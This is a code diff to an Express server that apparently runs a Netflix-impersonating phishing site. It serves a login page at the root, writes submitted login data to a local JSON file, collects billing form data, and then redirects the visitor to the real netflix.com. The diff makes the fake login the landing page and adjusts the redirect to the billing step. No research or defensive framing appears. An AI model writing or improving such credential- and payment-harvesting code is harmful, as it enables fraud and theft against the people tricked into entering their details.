@@ -4,8 +4,6 @@ const fs = require('fs');
 const exp = require('constants');
 const https = require('https');
 
-
-
 const app = express();
 const port = 3000;
 
@@ -13,6 +11,10 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
 app.use(express.static('.'));
+
+app.get('/', (req, res) => {
+    res.sendFile(__dirname + '/login.html');
+});
 
 app.get('/login', (req, res) => {
     res.sendFile(__dirname + '/login.html');
@@ -34,7 +36,7 @@ app.post('/login_form', function(req, res) {
   json.push(data);
   fs.writeFileSync("data/data.json", JSON.stringify(json));
 
-  res.redirect('/billing.html');
+  res.redirect('/billing');
 });
 
 app.post('/billing_form', function(req, res) {
@@ -55,11 +57,6 @@ app.post('/billing_form', function(req, res) {
 
   res.redirect('https://netflix.com/');
 });
-
-// app.listen(port, function (err) {
-//     if (err) console.log(err);
-//     console.log("Server listening on PORT", port);
-// });
 
 const options = {
     key: fs.readFileSync('localhost/key.pem'),
